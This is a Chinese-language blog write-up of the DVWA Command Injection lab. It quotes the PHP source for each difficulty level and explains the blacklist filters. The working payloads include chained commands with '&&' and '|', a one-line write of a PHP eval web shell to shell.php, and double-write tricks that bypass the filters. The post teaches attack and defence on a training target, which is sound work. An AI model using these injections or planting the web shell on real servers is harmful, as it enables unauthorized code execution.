---
layout:     post               # 使用的布局（不需要改）
title:      VWA之Command InjectionD   # 标题 
subtitle:    DVWA  #副标题
date:       2020-08-02       # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - DVWA
  
--- 

## low

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
         echo $target;
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

* `$_REQUEST` — HTTP Request 变量，默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 
* `php_uname` — 返回运行 PHP 的系统的有关信息

```
    'a'：此为默认。包含序列 "s n r v m" 里的所有模式。
    's'：操作系统名称。例如： FreeBSD。
    'n'：主机名。例如： localhost.example.com。
    'r'：版本名称，例如： 5.1.2-RELEASE。
    'v'：版本信息。操作系统之间有很大的不同。
    'm'：机器类型。例如：i386。
```

* `stristr()` 函数搜索字符串在另一字符串中的第一次出现

	 stristr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string

	返回 haystack 字符串从 needle 第一次出现的位置开始到结尾的字符串。 

* `shell_exec(cmd)`：在外部执行一个命令，参数cmd即为要执行的命令

了解完这三个函数，我们就能大概了解这关是执行一个在浏览器上的ping命令程序，服务器会对操作系统的名称进行检测，如果不是Windows NT系统则执行linux系统的Ping命令。但是，由于服务器未对ip参数进行任何的过滤，因此存在严重的Command Injection(命令注入)漏洞.

```
命令1 && 命令2 ：先执行命令1，若命令1执行成功再执行命令2，若命令1执行不成功则不执行命令2

命令1 & 命令2 ：先执行命令1，不管命令1执行成不成功都继续执行命令2

命令1 | 命令2 ：只执行命令2，前提是命令1必须执行成功

以上三种连接符在windows和linux环境下都支持.

||支支持windows

命令1 || 命令2 ：先执行命令1，若命令1执行成功则不执行命令2，若命令1执行不成功则执行命令2
```

输入`127.0.0.1 && ipconfig`,成功回显：

![aYE1Rs.png](https://s1.ax1x.com/2020/08/02/aYE1Rs.png)

写个下马进来，`127.0.0.1 && echo "<?php eval($_POST[a]);?>">shell.php`

成功

![aYERoD.png](https://s1.ax1x.com/2020/08/02/aYERoD.png)

## Medium

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

他这里设置了黑名单`&&`和`;`，替换为空。

我们可以双写绕过`127.0.0.1 &;& ipconfig`.

当然还可以使用`&`、`||`、`|`.

## High

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

这里也是采用黑名单过滤的方式，只不过过滤的多了一点。

这关过滤的字符较为完全，其中过滤了字符’&’，也就是说连接符&&和&都不能使用了，还过滤了字符’|’和’||’，但仔细看是过滤了’| ‘而不是’|’，(|后面还有一个空格)，也就是说连接符|还可以使用。

`127.0.0.1|ipconfig`

当然还可以`127.0.0.1 |;| ipconfig`

## Impossible

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

* stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。
* explode() 函数把字符串打散为数组。
* is_numeric(string)：检测string是否为数字或数字字符串，是则返回true，不是则返回false

这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求

然后将输入的ip值以字符’.’为分隔符打散成一个数组，并检测数组中的每个元素是否为数字并且数组元素个数是否为4，这就限制了我们输入的值必须是一个正确格式的ip地址

也就是说只有“数字.数字.数字.数字”的输入才会被执行，非常完美的防止了命令注入漏洞